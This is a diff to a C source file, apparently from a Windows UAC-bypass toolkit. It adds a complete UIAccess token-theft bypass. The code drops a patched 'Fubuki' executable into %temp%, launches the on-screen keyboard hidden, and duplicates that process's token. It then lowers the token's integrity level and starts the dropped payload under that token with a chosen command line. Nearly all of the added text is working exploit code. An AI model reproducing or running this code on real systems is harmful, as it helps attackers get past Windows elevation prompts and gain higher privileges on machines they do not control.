@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2018
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.15
 *
-*  DATE:        25 Aug 2018
+*  DATE:        15 Feb 2019
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -16,6 +16,7 @@
 *  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
 *  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
 *  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
+*  https://tyranidslair.blogspot.com/2019/02/accessing-access-tokens-for-uiaccess.html
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -315,5 +316,207 @@ BOOL ucmTokenModification(
     if (pIntegritySid) RtlFreeSid(pIntegritySid);
 
     RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
+    return bResult;
+}
+
+/*
+* ucmxTokenModUIAccessMethodInitPhase
+*
+* Purpose:
+*
+* Convert dll to new entrypoint/exe.
+*
+*/
+BOOL ucmxTokenModUIAccessMethodInitPhase(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL bResult = FALSE;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    do {
+
+        //
+        // Patch Fubuki to the new entry point and convert to EXE
+        //
+        if (!supReplaceDllEntryPoint(ProxyDll,
+            ProxyDllSize,
+            FUBUKI_ENTRYPOINT_UIACCESS2,
+            TRUE))
+        {
+            break;
+        }
+
+        //
+        // Drop modified Fubuki.exe to the %temp%
+        //
+        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcat(szBuffer, FUBUKI_EXE);
+        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
+            break;
+
+        bResult = TRUE;
+
+    } while (FALSE);
+
+    if (bResult == FALSE) {
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcat(szBuffer, FUBUKI_EXE);
+        DeleteFile(szBuffer);
+    }
+
+    return bResult;
+}
+
+/*
+* ucmTokenModUIAccessMethod
+*
+* Purpose:
+*
+* Obtain token from UIAccess application, modify it and reuse for UAC bypass.
+*
+*/
+BOOL ucmTokenModUIAccessMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL bResult = FALSE;
+
+    NTSTATUS Status;
+    LPWSTR lpszPayload = NULL;
+    PSID pIntegritySid = NULL;
+    HANDLE hDupToken = NULL, hProcessToken = NULL;
+    SHELLEXECUTEINFO shinfo;
+    SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
+    TOKEN_MANDATORY_LABEL tml;
+    SECURITY_QUALITY_OF_SERVICE sqos;
+    OBJECT_ATTRIBUTES obja;
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+        
+    do {
+        //
+        // Tweak and drop payload to %temp%.
+        //
+        if (!ucmxTokenModUIAccessMethodInitPhase(ProxyDll, ProxyDllSize))
+            break;
+
+        //
+        // Spawn OSK.exe process.
+        //
+        _strcpy(szBuffer, g_ctx->szSystemDirectory);
+        _strcat(szBuffer, OSK_EXE);
+
+        shinfo.cbSize = sizeof(shinfo);
+        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+        shinfo.lpFile = szBuffer;
+        shinfo.nShow = SW_HIDE;
+        if (!ShellExecuteEx(&shinfo))
+            break;
+
+        //
+        // Open process token.
+        //
+        Status = NtOpenProcessToken(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
+        if (!NT_SUCCESS(Status))
+            break;
+
+        //
+        // Duplicate primary token.
+        //
+        sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
+        sqos.ImpersonationLevel = SecurityImpersonation;
+        sqos.ContextTrackingMode = 0;
+        sqos.EffectiveOnly = FALSE;
+        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
+        obja.SecurityQualityOfService = &sqos;
+        Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);
+        if (!NT_SUCCESS(Status))
+            break;
+
+        NtClose(hProcessToken);
+        hProcessToken = NULL;
+
+        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
+        NtClose(shinfo.hProcess);
+        shinfo.hProcess = NULL;
+
+        //
+        // Lower duplicated token IL from Medium+ to Medium.
+        //
+        Status = RtlAllocateAndInitializeSid(&MLAuthority,
+            1, SECURITY_MANDATORY_MEDIUM_RID,
+            0, 0, 0, 0, 0, 0, 0,
+            &pIntegritySid);
+        if (!NT_SUCCESS(Status))
+            break;
+
+        tml.Label.Attributes = SE_GROUP_INTEGRITY;
+        tml.Label.Sid = pIntegritySid;
+
+        Status = NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml,
+            (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
+        if (!NT_SUCCESS(Status))
+            break;
+
+        RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+        RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
+        si.cb = sizeof(STARTUPINFO);
+        GetStartupInfo(&si);
+
+        // 
+        // Run second stage exe to perform some gui hacks.
+        //
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcat(szBuffer, FUBUKI_EXE);
+
+        if (g_ctx->OptionalParameterLength == 0)
+            lpszPayload = g_ctx->szDefaultPayload;
+        else
+            lpszPayload = g_ctx->szOptionalParameter;
+
+        bResult = CreateProcessAsUser(hDupToken, 
+            szBuffer,    //application
+            lpszPayload, //command line
+            NULL, 
+            NULL, 
+            FALSE,
+            CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS,
+            NULL, 
+            NULL, 
+            &si, 
+            &pi);
+
+        if (bResult) {
+            if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT)
+                TerminateProcess(pi.hProcess, (UINT)-1);
+
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        }
+
+    } while (FALSE);
+
+    if (hProcessToken) NtClose(hProcessToken);
+
+    if (shinfo.hProcess) {
+        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
+        NtClose(shinfo.hProcess);
+    }
+    if (hDupToken) NtClose(hDupToken);
+    if (pIntegritySid) RtlFreeSid(pIntegritySid);
+
+    _strcpy(szBuffer, g_ctx->szTempDirectory);
+    _strcat(szBuffer, FUBUKI_EXE);
+    DeleteFile(szBuffer);
+
     return bResult;
 }
